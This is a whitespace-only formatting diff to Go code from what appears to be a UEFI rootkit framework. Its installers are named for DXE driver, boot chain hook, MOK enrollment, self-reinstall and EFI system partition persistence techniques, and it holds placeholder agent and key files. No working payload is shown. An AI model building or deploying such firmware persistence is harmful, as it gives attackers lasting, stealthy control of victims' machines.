@@ -65,9 +65,9 @@ func (m *DXEDriverMethod) Install(config *RootkitConfig) (*RootkitResult, error)
 		Technique: TechniqueDXEDriver,
 		Layer:     LayerUEFI,
 		Details: map[string]string{
-			"driver_path":  driverPath,
-			"backup_path":  backupPath,
-			"esp_path":     espPath,
+			"driver_path": driverPath,
+			"backup_path": backupPath,
+			"esp_path":    espPath,
 		},
 	}, nil
 }
@@ -146,7 +146,7 @@ func (m *BootChainHookMethod) Install(config *RootkitConfig) (*RootkitResult, er
 		Technique: TechniqueBootChainHook,
 		Layer:     LayerUEFI,
 		Details: map[string]string{
-			"boot_path":  bootx64Path,
+			"boot_path":   bootx64Path,
 			"backup_path": backupPath,
 		},
 	}, nil
@@ -436,8 +436,8 @@ func (m *MOKEnrollMethod) Install(config *RootkitConfig) (*RootkitResult, error)
 		Technique: TechniqueMOKEnroll,
 		Layer:     LayerUEFI,
 		Details: map[string]string{
-			"key_path":   keyPath,
-			"cert_path":  certPath,
+			"key_path":  keyPath,
+			"cert_path": certPath,
 		},
 	}, nil
 }
@@ -510,9 +510,9 @@ done
 		Technique: TechniqueSelfReinstall,
 		Layer:     LayerUEFI,
 		Details: map[string]string{
-			"self_path":    selfPath,
-			"backup_path":  backupPath,
-			"script_path":  scriptPath,
+			"self_path":   selfPath,
+			"backup_path": backupPath,
+			"script_path": scriptPath,
 		},
 	}, nil
 }
@@ -567,9 +567,9 @@ func (m *ESPPersistenceMethod) Install(config *RootkitConfig) (*RootkitResult, e
 	}
 
 	persistData := map[string][]byte{
-		"agent.dat":      []byte("agent_binary_data"),
-		"config.dat":     []byte("config_data"),
-		"keys.dat":       []byte("encryption_keys"),
+		"agent.dat":  []byte("agent_binary_data"),
+		"config.dat": []byte("config_data"),
+		"keys.dat":   []byte("encryption_keys"),
 	}
 
 	for name, data := range persistData {
@@ -592,9 +592,9 @@ func (m *ESPPersistenceMethod) Install(config *RootkitConfig) (*RootkitResult, e
 		Technique: TechniqueESPPersistence,
 		Layer:     LayerUEFI,
 		Details: map[string]string{
-			"esp_path":    espPath,
+			"esp_path":     espPath,
 			"persist_path": persistPath,
-			"fstab_path":  fstabPath,
+			"fstab_path":   fstabPath,
 		},
 	}, nil
 }
